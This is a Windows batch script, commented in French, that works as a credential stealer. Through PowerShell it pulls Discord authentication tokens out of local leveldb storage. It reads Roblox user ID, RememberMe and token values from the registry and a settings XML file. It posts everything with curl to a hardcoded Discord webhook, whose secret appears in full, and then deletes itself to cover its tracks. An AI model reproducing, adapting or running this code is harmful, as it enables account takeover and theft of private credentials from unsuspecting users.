@echo off
setlocal enabledelayedexpansion
:: PALOFSC - EXFILTRATION AMELIOREE (POWERSHELL + REGISTRE)

set "WEBHOOK=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"

:: ETAPE 1 : RECUPERATION DES TOKENS DISCORD VIA POWERSHELL (plus fiable)
set "ps_cmd=powershell -NoProfile -Command "$tokens=@(); $paths=@($env:APPDATA+'\\Discord\\Local Storage\\leveldb', $env:APPDATA+'\\discordptb\\Local Storage\\leveldb', $env:APPDATA+'\\discordcanary\\Local Storage\\leveldb'); foreach($p in $paths){if(Test-Path $p){Get-ChildItem $p -Filter *.log | ForEach-Object {Select-String -Path $_.FullName -Pattern '[a-zA-Z0-9_\-]{24,28}\.[a-zA-Z0-9_\-]{6,7}\.[a-zA-Z0-9_\-]{27,38}' -AllMatches | ForEach-Object {$_.Matches.Value}}} | ForEach-Object {$tokens+=$_}}; $tokens -join ' '"
for /f "delims=" %%a in ('%ps_cmd%') do set "tokens=%%a"

:: ETAPE 2 : RECUPERATION DES DONNEES ROBLOX (registre + fichier XML)
set "roblox_user="
set "roblox_pass="
set "roblox_token="
:: UserID depuis le registre
for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "UserID" 2^>nul') do set "roblox_user=%%a"
:: RememberMe (peut contenir le mot de passe hashé)
for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "RememberMe" 2^>nul') do set "roblox_pass=%%a"
:: Token depuis le fichier XML (si existe)
if exist "%LOCALAPPDATA%\Roblox\GlobalBasicSettings_13.xml" (
  for /f "tokens=2 delims=<>" %%a in ('findstr /r /c:"<token>" "%LOCALAPPDATA%\Roblox\GlobalBasicSettings_13.xml" 2^>nul') do set "roblox_token=%%a"
)

:: ETAPE 3 : CONSTRUCTION DU MESSAGE A ENVOYER
set "msg="
if not "!tokens!"=="" set "msg=!msg!Tokens Discord : !tokens!\n"
if not "!roblox_user!"=="" set "msg=!msg!Roblox UserID : !roblox_user!\n"
if not "!roblox_pass!"=="" set "msg=!msg!Roblox RememberMe : !roblox_pass!\n"
if not "!roblox_token!"=="" set "msg=!msg!Roblox Token : !roblox_token!\n"
if "!msg!"=="" set "msg=Aucune donnee collectee.\n"

:: Echappement pour JSON (guillemets et retours chariot)
set "msg=!msg:"=\"!"
set "msg=!msg:\n=\\n!"

:: ETAPE 4 : ENVOI VIA CURL
curl -s -H "Content-Type: application/json" -d "{\"content\":\"%msg%\"}" "%WEBHOOK%" >nul 2>&1

:: ETAPE 5 : NETTOYAGE ET SUPPRESSION
set "tokens="
set "roblox_user="
set "roblox_pass="
set "roblox_token="
set "msg="
del /f /q "%~f0" >nul 2>&1
exit /b 0
